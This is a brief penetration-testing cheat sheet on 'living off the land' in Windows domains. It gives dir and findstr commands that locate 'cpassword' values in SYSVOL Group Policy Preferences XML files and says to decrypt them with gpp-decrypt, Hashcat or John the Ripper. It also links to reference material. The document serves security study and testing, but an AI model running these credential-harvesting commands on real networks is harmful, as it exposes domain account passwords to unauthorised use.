# Living off the Land

## 01 - Command Prompt

Use the `dir` command to find the XML file.

```
C:\> dir /s Groups.xml

C:\> dir /s %LOGONSERVER%\SYSVOL\*\Groups.xml
```

Use `findstr.exe` to search for `cpassword` keyword to every `.xml` files.

```
C:\> findstr.exe /s cpassword C:\Windows\SYSVOL\<domain_name>\Policies\*.xml

C:\> findstr.exe /s cpassword \\%LOGONSERVER%\SYSVOL\*.xml
```

Copy the **cpassword** attribute after you've opened the XML file. Then decrypt it using `gpp-decrypt` utility or any other password cracking programs that is highly recommended like **Hashcat** or **John The Ripper**.

```
C:\> type C:\path\to\GPP_file.xml
```

---
## References

### LOLBAS

- [LOLBAS: findstr](https://lolbas-project.github.io/lolbas/Binaries/Findstr/)

### ADSecurity

- [Active Directory Security: Finding Passwords in SYSVOL & Exploiting Group Policy Preferences](https://adsecurity.org/?p=2288)

### InfoSec Matter

- [InfoSec Matter: Powershell Commands for Pentesters](https://www.infosecmatter.com/powershell-commands-for-pentesters/)